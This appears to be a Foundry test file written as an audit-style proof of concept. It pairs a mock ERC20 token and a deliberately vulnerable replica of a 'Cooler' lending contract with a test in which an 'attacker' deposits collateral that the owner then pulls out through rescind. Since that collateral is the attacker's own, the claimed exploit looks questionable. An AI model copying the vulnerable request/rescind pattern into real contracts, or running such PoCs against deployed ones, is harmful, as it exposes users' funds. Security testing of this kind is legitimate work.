pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface ERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

// Minimal ERC20 mock used for the PoC
contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        require(allowance[from][msg.sender] >= amt, "allow");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Minimal vulnerable replica (only the state + functions our test touches)
contract Cooler {
    address public owner;
    ERC20 public immutable collateral;
    uint256 private constant decimals = 1e18;

    struct Request {
        uint256 amount;
        uint256 interest;
        uint256 loanToCollateral;
        uint256 duration;
        bool active;
    }
    Request[] public requests;

    constructor(address o, ERC20 c) {
        owner = o;
        collateral = c;
    }

    // Vulnerable: anyone can call request and deposit collateral for the immutable owner
    function request(
        uint256 amount,
        uint256 interest,
        uint256 loanToCollateral,
        uint256 duration
    ) external returns (uint256 reqID) {
        reqID = requests.length;
        requests.push(Request(amount, interest, loanToCollateral, duration, true));
        collateral.transferFrom(msg.sender, address(this), collateralFor(amount, loanToCollateral));
    }

    // Only owner can rescind, and rescind always sends collateral to owner —
    // if someone else deposited collateral in request(), owner can pull it.
    function rescind(uint256 reqID) external {
        if (msg.sender != owner) revert("OnlyApproved");
        Request storage req = requests[reqID];
        if (!req.active) revert("Deactivated");
        req.active = false;
        collateral.transfer(owner, collateralFor(req.amount, req.loanToCollateral));
    }

    function collateralFor(uint256 amount, uint256 loanToCollateral) public pure returns (uint256) {
        return amount * decimals / loanToCollateral;
    }
}

contract CoolerTest is Test {
    Cooler target;
    ERC20Mock token;
    address ownerAddr;
    address attacker;

    function setUp() public {
        ownerAddr = makeAddr("owner");
        attacker = makeAddr("attacker");
        token = new ERC20Mock();
        // give attacker some collateral
        token.mint(attacker, 10 ether);
        target = new Cooler(ownerAddr, ERC20(address(token)));
    }

    function test_attacker_exploits_request() public {
        uint256 amount = 1 ether; // debt amount
        uint256 loanToCollateral = 1e18; // 1:1 for simplicity -> collateral = amount
        uint256 interest = 0;
        uint256 duration = 1 days;

        // attacker approves the Cooler to pull collateral
        vm.prank(attacker);
        token.approve(address(target), target.collateralFor(amount, loanToCollateral));

        // attacker creates a request and deposits collateral
        vm.prank(attacker);
        uint256 reqID = target.request(amount, interest, loanToCollateral, duration);

        // owner calls rescind and receives the collateral the attacker deposited
        assertEq(token.balanceOf(ownerAddr), 0);
        vm.prank(ownerAddr);
        target.rescind(reqID);
        assertEq(token.balanceOf(ownerAddr), target.collateralFor(amount, loanToCollateral));
    }
}

